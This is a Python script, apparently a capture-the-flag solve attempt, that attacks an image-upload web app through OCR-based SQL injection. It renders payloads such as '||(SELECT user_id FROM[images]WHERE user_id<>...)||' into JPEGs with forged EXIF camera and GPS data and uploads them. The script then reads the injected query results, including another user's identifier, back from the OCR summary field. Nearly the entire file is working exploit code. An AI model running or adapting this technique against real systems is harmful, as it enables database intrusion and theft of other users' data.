# v2_final.py — revert to the WORKING image format (the one that gave '93.46.19' and '9659').
# Only problem: OCR reorders "FROM images". Try identifier tricks that avoid the two-word FROM:
#   - FROM"images"  (quoted identifier, no space)
#   - FROM[images]  (bracket identifier, SQLite supports [])
#   - a subquery in the SELECT list that references images without a top-level FROM order issue
# Keep the exact working canvas from v2_isolate (W up to ~2200, H 260, size 30).
import requests, base64, re
from PIL import Image, ImageDraw, ImageFont
import piexif

BASE = "https://chl-453bbf5a-0b09-4ad8-a4f2-61aeaba1384e-mis-viajes-v2.softwareseguro.com.ar"
html = requests.get(BASE+"/").text
UID = re.search(r'([0-9a-f]{8}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{4}-[0-9a-f]{12})', html).group(1)
base_img = Image.open("paisaje.png").convert("RGB")
CNT=[0]

def font(sz):
    for p in ["C:/Windows/Fonts/consolab.ttf","C:/Windows/Fonts/cour.ttf"]:
        try: return ImageFont.truetype(p, sz)
        except: pass
    return ImageFont.load_default()

def build(text, size=30):   # EXACT working format from v2_isolate.py
    W=min(2000,max(1000,40+int(len(text)*size*0.56))); H=260
    img=base_img.resize((W,H)); d=ImageDraw.Draw(img); f=font(size)
    bb=d.textbbox((20,20),text,font=f); d.rectangle([0,0,W,bb[3]+20],fill=(255,255,255))
    d.text((20,20),text,font=f,fill=(0,0,0)); img.save("fn.jpg","jpeg",quality=72,optimize=True)
    def dms(x):
        dd=int(x);mm=int((x-dd)*60);s=round((x-dd-mm/60)*3600,4);return((dd,1),(mm,1),(int(s*100),100))
    ex={'0th':{piexif.ImageIFD.Make:b'Samsung',piexif.ImageIFD.Model:b'Galaxy S25'},
        'Exif':{piexif.ExifIFD.DateTimeOriginal:b'2025:10:01 23:51:37'},
        'GPS':{piexif.GPSIFD.GPSLatitudeRef:b'S',piexif.GPSIFD.GPSLatitude:dms(41.13),
               piexif.GPSIFD.GPSLongitudeRef:b'W',piexif.GPSIFD.GPSLongitude:dms(71.31)}}
    piexif.insert(piexif.dump(ex),"fn.jpg")
    return "data:image/jpeg;base64,"+base64.b64encode(open("fn.jpg","rb").read()).decode()

def up(painted, desc):
    CNT[0]+=1
    r=requests.post(f"{BASE}/upload", json={"image":build(painted),"description":desc,"user_id":UID})
    ocr=""
    if r.status_code==200:
        data=requests.get(f"{BASE}/images/{UID}").json()
        row=next((x for x in data if x.get("description")==desc),None)
        ocr=row.get("summary_ocr","") if row else ""
    print(f"{desc:16} {r.status_code} ocr={ocr!r}")
    return r.status_code, ocr

q='"'  # double quote for identifiers... but painting " may fail. We'll try several.
sq="'"
print("=== re-confirm base format works ===")
up("9"+sq+"||(SELECT sqlite_version())||"+sq+"9", "reconfirm")   # expect 200 '93.46.1...'

print("\n=== table read avoiding 'FROM images' two-word reorder ===")
# bracket identifier: FROM[images]  (SQLite supports [ident])
up("9"+sq+"||(SELECT count(*) FROM[images])||"+sq+"9", "bracket_count")
# glue with no space at all: FROMimages won't parse; use parens tightly: FROM(images)
up("9"+sq+"||(SELECT count(*) FROM (images))||"+sq+"9", "parens_count")
# put table first via a CTE-like? simpler: use a scalar subquery reading images by rowid
up("9"+sq+"||(SELECT user_id FROM[images]WHERE id=1)||"+sq+"9", "bracket_uid1")
up("9"+sq+"||(SELECT user_id FROM[images]WHERE user_id<>"+sq+UID+sq+"LIMIT 1)||"+sq+"9", "bracket_victim")
